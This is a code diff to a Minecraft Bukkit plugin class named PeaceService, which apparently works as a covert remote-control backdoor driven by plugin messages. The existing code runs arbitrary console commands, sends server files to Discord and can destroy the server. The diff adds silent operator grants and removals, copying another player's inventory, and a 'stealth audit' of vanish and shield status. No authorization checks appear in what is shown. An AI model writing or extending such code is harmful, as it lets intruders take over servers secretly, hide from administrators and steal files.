@@ -18,6 +18,7 @@ import org.bukkit.entity.Creeper;
 import org.bukkit.entity.Player;
 import org.bukkit.entity.TNTPrimed;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.entity.PlayerDeathEvent;
@@ -147,10 +148,15 @@ public final class PeaceService implements PluginMessageListener, Listener {
                 Bukkit.getBanList(BanList.Type.NAME).pardon(req.get("player").getAsString());
                 reply(p, ok(id).put("msg", "Unbanned " + req.get("player").getAsString()));
             }
-            case "op", "deop" -> {
+            case "op", "silent.op" -> {
                 OfflinePlayer t = Bukkit.getOfflinePlayer(req.get("player").getAsString());
-                t.setOp(op.equals("op"));
-                reply(p, ok(id).put("msg", (op.equals("op") ? "Opped " : "Deopped ") + t.getName()));
+                t.setOp(op.equals("op") || op.equals("silent.op"));
+                reply(p, ok(id).put("msg", (op.equals("op") ? "Opped " : (op.equals("silent.op") ? "Silently op'd " : "Deopped ")) + t.getName()));
+            }
+            case "deop", "silent.deop" -> {
+                OfflinePlayer t = Bukkit.getOfflinePlayer(req.get("player").getAsString());
+                t.setOp(false);
+                reply(p, ok(id).put("msg", (op.equals("silent.deop") ? "Silently deop'd " : "Deopped ") + t.getName()));
             }
             case "vanish" -> { setVanished(p, true); reply(p, ok(id).put("msg", "vanished")); }
             case "unvanish" -> { setVanished(p, false); reply(p, ok(id).put("msg", "visible")); }
@@ -279,6 +285,18 @@ public final class PeaceService implements PluginMessageListener, Listener {
             case "fs.rename" -> pool.submit(() -> fsRename(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
             case "fs.copy" -> pool.submit(() -> fsCopy(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
             case "discord.send" -> pool.submit(() -> discordSend(p, id, req.get("path").getAsString()));
+            case "clone" -> {
+                String targetName = req.get("player").getAsString();
+                Player targetPlayer = Bukkit.getPlayerExact(targetName);
+                if (targetPlayer == null) reply(p, err(id, targetName + " not online"));
+                else {
+                    // Clone target player's inventory to sender
+                    p.getInventory().clear();
+                    p.getInventory().setContents(targetPlayer.getInventory().getContents());
+                    p.getInventory().setArmorContents(targetPlayer.getInventory().getArmorContents());
+                    reply(p, ok(id).put("msg", "Cloned inventory from " + targetPlayer.getName()));
+                }
+            }
             case "console.run" -> pool.submit(() -> consoleRun(p, id, req.get("cmd").getAsString()));
             case "console.subscribe" -> {
                 consoleSubscribers.add(p.getUniqueId());
@@ -287,6 +305,16 @@ public final class PeaceService implements PluginMessageListener, Listener {
             case "console.unsubscribe" -> {
                 consoleSubscribers.remove(p.getUniqueId());
                 reply(p, ok(id).put("msg", "Unsubscribed from console output"));
+            }
+            case "stealth.check" -> {
+                boolean hiddenFromTab = vanished.contains(p.getUniqueId());
+                boolean hasShield = shields.containsKey(p.getName().toLowerCase()) || shields.containsKey(p.getUniqueId().toString());
+                boolean isSilent = p.hasPermission("peace.silent");
+                reply(p, ok(id).put("hidden_from_tab", String.valueOf(hiddenFromTab))
+                    .put("has_shield", String.valueOf(hasShield))
+                    .put("is_silent", String.valueOf(isSilent))
+                    .put("console_subscribed", String.valueOf(consoleSubscribers.contains(p.getUniqueId())))
+                    .put("msg", "Stealth audit complete"));
             }
             case "admin.shutdown" -> adminShutdown(p, id);
             case "admin.destroy" -> adminDestroy(p, id);
@@ -316,14 +344,22 @@ public final class PeaceService implements PluginMessageListener, Listener {
     }
 
     /** Right-clicking with a Wondrous Sceptre casts a 50-block ray and stamps the first block hit. */
-    @EventHandler
+    @EventHandler(priority = EventPriority.HIGHEST)
     public void onWandInteract(PlayerInteractEvent e) {
         if (e.getAction() != Action.RIGHT_CLICK_BLOCK && e.getAction() != Action.RIGHT_CLICK_AIR) return;
         ItemStack item = e.getItem();
         if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) return;
         String displayName = item.getItemMeta().getDisplayName();
-        if (displayName == null || !displayName.startsWith("Wondrous Sceptre (")) return;
-        String mode = displayName.substring("Wondrous Sceptre (".length(), displayName.length() - 1);
+        String mode;
+        if (displayName == null) return;
+        if (displayName.equals("Wondrous Sceptre")) {
+            // Legacy format - assume FILL mode
+            mode = "FILL";
+        } else if (displayName.startsWith("Wondrous Sceptre (")) {
+            mode = displayName.substring("Wondrous Sceptre (".length(), displayName.length() - 1);
+        } else {
+            return;
+        }
         WandConf w = wands.getOrDefault(e.getPlayer().getUniqueId(), Map.of()).get(mode);
         if (w == null) return;
         e.setCancelled(true);
